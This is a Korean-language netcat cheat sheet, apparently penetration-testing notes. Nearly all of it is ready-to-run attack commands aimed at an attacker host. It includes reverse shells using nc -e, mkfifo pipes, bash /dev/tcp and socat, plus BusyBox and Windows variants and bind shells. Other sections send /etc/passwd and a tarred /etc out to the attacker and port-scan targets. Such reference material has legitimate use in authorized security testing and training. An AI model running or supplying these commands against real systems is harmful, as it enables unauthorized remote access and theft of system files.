# netcat

# 리버스쉘 — Netcat (nc)

---

## 리스너

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444    # 화살표/히스토리 지원
nc -lvnp 4444 -k        # 연결 끊겨도 재대기 (ncat)
```

---

## 리버스쉘 연결

### e 지원 버전 (전통적 nc, ncat)

```bash
nc -e /bin/sh <칼리IP> 4444
nc -e /bin/bash <칼리IP> 4444
ncat <칼리IP> 4444 -e /bin/bash
ncat <칼리IP> 4444 -e /bin/sh
```

### e 미지원 버전 (Debian/Ubuntu 기본 nc)

```bash
# mkfifo 파이프 트릭 (가장 보편적)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <칼리IP> 4444 > /tmp/f

# /tmp 못 쓸 때 대안 경로
rm /dev/shm/f; mkfifo /dev/shm/f; cat /dev/shm/f | /bin/sh -i 2>&1 | nc <칼리IP> 4444 > /dev/shm/f

# bash /dev/tcp 조합
bash -c 'bash -i >& /dev/tcp/<칼리IP>/4444 0>&1'
```

### BusyBox nc (임베디드 장치, IoT, Alpine 등)

```bash
busybox nc <칼리IP> 4444 -e sh
busybox nc -e /bin/sh <칼리IP> 4444
```

### Windows nc.exe

```bash
nc.exe -e cmd.exe <칼리IP> 4444
nc.exe -e powershell.exe <칼리IP> 4444
```

---

## nc 버전 확인 방법

```bash
nc --help 2>&1 | head -5
# "-e" 옵션 있으면 지원, 없으면 mkfifo 사용

nc -h 2>&1 | grep "\-e"
```

---

## 바인드 쉘 (Bind Shell)

피해자 측에서 포트를 열고 공격자가 접속하는 방식. 방화벽 인바운드 허용 시 사용.

```bash
# 피해자 측 (포트 오픔)
nc -lvnp 4444 -e /bin/bash    # -e 지원 시
rm /tmp/f; mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1 &  # -e 미지원

# 공격자 측 (접속)
nc <타겟IP> 4444
```

---

## nc로 파일 전송

```bash
# 받는 쪽 (공격자)
nc -lvnp 4444 > received_file.txt

# 보내는 쪽 (피해자)
nc <칼리IP> 4444 < /etc/passwd

# 바이너리 전송
nc -lvnp 4444 > linpeas.sh
nc <칼리IP> 4444 < /tmp/linpeas.sh

# 디렉터리 전체 (tar 조합)
# 보내는 쪽:
tar -czf - /etc | nc <칼리IP> 4444
# 받는 쪽:
nc -lvnp 4444 | tar -xzf -
```

---

## nc로 포트 스캔

```bash
# TCP 포트 스캔
nc -zv <IP> 80
nc -zv <IP> 1-1000          # 범위 스캔
nc -zvn <IP> 22 80 443 445  # 특정 포트들

# UDP 스캔
nc -zvu <IP> 53 161
```

---

## nc 없을 때 대안

```bash
# ncat (nmap-ncat 패키지)
ncat <칼리IP> 4444 -e /bin/bash

# /dev/tcp (bash 내장)
bash -i >& /dev/tcp/<칼리IP>/4444 0>&1

# socat (socat 설치된 경우)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<칼리IP>:4444
```

---

## 팁

- Kali는 `ncat` (nmap 포함)이 기본 → `e` 지원
- Ubuntu/Debian은 `netcat-openbsd` 기본 → `e` 미지원 → mkfifo 사용
- `which nc ncat netcat` 으로 먼저 확인
- 파일 전송 후 md5sum으로 무결성 확인